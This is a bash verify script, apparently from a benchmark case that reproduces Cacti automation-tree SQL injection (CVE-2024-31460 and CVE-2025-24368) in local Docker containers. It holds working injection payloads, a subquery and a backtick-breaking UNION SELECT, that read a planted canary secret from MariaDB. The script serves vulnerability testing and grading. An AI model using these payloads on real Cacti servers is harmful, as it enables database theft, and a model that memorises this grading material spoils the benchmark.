#!/usr/bin/env bash
# verify.sh --seed|--residual — cacti-cve-2025-24368
# （CVE-2024-31460 seed / CVE-2025-24368 residual，Cacti 自动化树 SQLi，read-exfil）。
#
# 机制：pcb_probe.php 把攻击者控制的 automation tree-rule item `field`（seed）与
# match-rule-item `field`（residual）存进真实 MariaDB，再调用真实 lib/api_automation.php：
#   seed     display_matching_trees(): $sql_field = $item['field'] . ' AS source '
#            （SELECT-list 子查询上下文；V0=1.2.26 无消费守卫直接拼接；
#             V1=1.2.27 有 api_automation_column_exists() 拒绝非列名 -> 'SQL Injection' AS source）
#   residual build_rule_item_filter(): '`'.implode('`.`',explode('.',$item['field'])).'`'
#            （WHERE 反引号标识符上下文；1.2.27 的 31460 修复未覆盖此 sink；
#             V2=1.2.29 才有 store 侧 db_column_exists 守卫）
# 效果 = UNION / 子查询把 pcb_secrets.secret（${PCB_FLAG}）反射进结果 rows
#        （seed 落在 source 列，residual 落在 description 列）。
# 效果通道 = HTTP 响应 JSON body（pcb_probe.php?action=run 的 rows）。
# flag 通道 = canary 类（entrypoint.sh 启动时把 ${PCB_FLAG} 种入真实 MariaDB 的
#             pcb_secrets 表，验证者通过 SQLi 读取）。
# 判定基准 = RUN_FLAG（提交值；canary 类，服务端种入值与提交值一致时才算效果）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
if [[ -n "${RUN_FLAG_REF:-}" && "$RUN_FLAG" != "$RUN_FLAG_REF" ]]; then
  echo "status=rejected(wrong/stale flag)"
  exit 10
fi
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# Ignore leftover controller PORT_*; use this run's compose.env for interpolation.
unset PORT_V0_0 PORT_V1_0 PORT_V2_0
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
export PORT_V0_0 PORT_V1_0 PORT_V2_0

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

PORT=""
for _ in $(seq 1 30); do
  PORT="$(dc port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' | head -1)"
  if [[ -n "$PORT" ]]; then
    break
  fi
  sleep 1
done
[[ -n "$PORT" ]] || { echo "cannot resolve host port for $VERSION" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
BASE="http://127.0.0.1:$PORT"

ready=0
for _ in $(seq 1 60); do
  body="$(curl -sS -m 5 "${BASE}/pcb_probe.php?action=health" || true)"
  if printf '%s' "$body" | grep -qE '"ok"[[:space:]]*:[[:space:]]*true'; then
    ready=1
    break
  fi
  sleep 2
done
if [[ "$ready" != 1 ]]; then
  echo "verify: pcb_probe health timeout on ${BASE}" >&2
  exit 20
fi

# 攻击参数：与 poc/original_poc.py（seed）和 _heldout/bypass_poc.py（residual）一致。
if [[ "$MODE" == "--seed" ]]; then
  ITEM_FIELD="(SELECT secret FROM pcb_secrets LIMIT 1)"  # SELECT-list 子查询
  M_FIELD="hostname"                                      # 良性 match item，让查询返回 seed 主机行
  M_OPERATION="0"; M_OPERATOR="1"; M_PATTERN="local"      # AUTOMATION_OPER_NULL / OP_CONTAINS
else
  ITEM_FIELD="hostname"                                   # 良性 seed field（V1 消费守卫放行）
  M_FIELD="hostname\`='zzz') UNION SELECT 1,2,(SELECT secret FROM pcb_secrets LIMIT 1),4,5,6,7-- "
  M_OPERATION="0"; M_OPERATOR="0"; M_PATTERN=""           # OP_NONE：不追加 pattern
fi

BODY="$(PCB_BASE="$BASE" PCB_ITEM="$ITEM_FIELD" PCB_MFIELD="$M_FIELD" \
        PCB_MOP="$M_OPERATION" PCB_MOPER="$M_OPERATOR" PCB_MPAT="$M_PATTERN" \
        "$PY" - <<'PYEOF' 2>&1
import os, sys, time, urllib.error, urllib.parse, urllib.request
base = os.environ["PCB_BASE"]
params = {
    "action": "run",
    "item_field": os.environ["PCB_ITEM"],
    "m_field": os.environ["PCB_MFIELD"],
    "m_operation": os.environ["PCB_MOP"],
    "m_operator": os.environ["PCB_MOPER"],
    "m_pattern": os.environ["PCB_MPAT"],
}
url = base + "/pcb_probe.php?" + urllib.parse.urlencode(params)
last = ""
for _ in range(10):
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
        print(body[:4000])
        sys.exit(0)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        print(body[:4000])
        sys.exit(0)
    except Exception as e:
        last = "<request-error: %s: %s>" % (type(e).__name__, e)
        time.sleep(6)
print(last)
sys.exit(1)
PYEOF
)"
RC=$?
if [[ $RC -ne 0 ]]; then echo "$BODY" >&2; exit 20; fi
echo "$BODY" | head -c 600; echo
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
